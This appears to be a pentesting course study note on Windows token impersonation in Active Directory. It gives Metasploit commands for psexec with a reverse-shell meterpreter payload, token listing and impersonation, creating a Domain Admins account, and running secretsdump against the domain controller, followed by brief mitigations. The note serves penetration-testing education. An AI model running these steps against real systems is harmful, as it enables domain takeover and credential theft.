---
tags:
  - PEH
---
## Definition of tokens
Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file (**think cookies for computers**).

There are two types of tokens:
- Delegate: Created for logging into a machine or using a Remote Desktop
- Impersonate: non interactive, such as attaching a network drive or a domain logon script.
to see if the machine that you popped a shell into has a high value user currently logged-in (for example: administrator)
## Executing Token Impersonation in [[Metasploit - ميتاسبلويت|MS]] using password
1. Run `msf` and setup options to [[Gaining shell access (in AD)|gain shell access]]
```bash
# Run Metasploit
msfconsole

# Search for windows/smb/psexc and choose setp
msf > search psexec
msf > use 24

# Set options
msf > set payload windows/x64/meterpreter/reverse_tcp
msf > set RHOST <ip-victim>
msf > set SMBUser <username>
msf > set SMBPass <password>
msf > set SMBDomain <domain-name>.local
msf > run
```
2. Load incognito mode
```bash
msf > load incognito
```
3. List tokens of groups and users
```bash
meterpreter > list_tokens -u
meterpreter > list_tokens -g
# First is for user tokens while the second one is for group tokens
```
4. Impersonate! (based on the results of previous command, if we find \<domain-name>\administrator that is a WIN!)
```bash
meterpreter > impersonate_token <domain>\\<user>
```
5. Now, since you impersonated administrator and have administrator privileges, you can add users
```bash
net user /add <username> <password> /domain
```
6. Add created user to domain admins
```bash
net group "Domain Admins" <username> /ADD /DOMAIN
```
7. Now, using our created domain admin. We can [[Dumping and cracking hashes|secretsdump]] the **domain controller because we are in the domain admins group!**
```bash
secretsdump.py <domain-name>/<created-admin>:"<password-created>"@<dc-ip>
```
>[!INFO] rev2self
>Run rev2self if you want to go back from the impersonation to the stage were you just popped the shell at. 
## Token Impersonation mitigation
- Limit user/group token creation permission
- Account tiering
- Local admin restriction
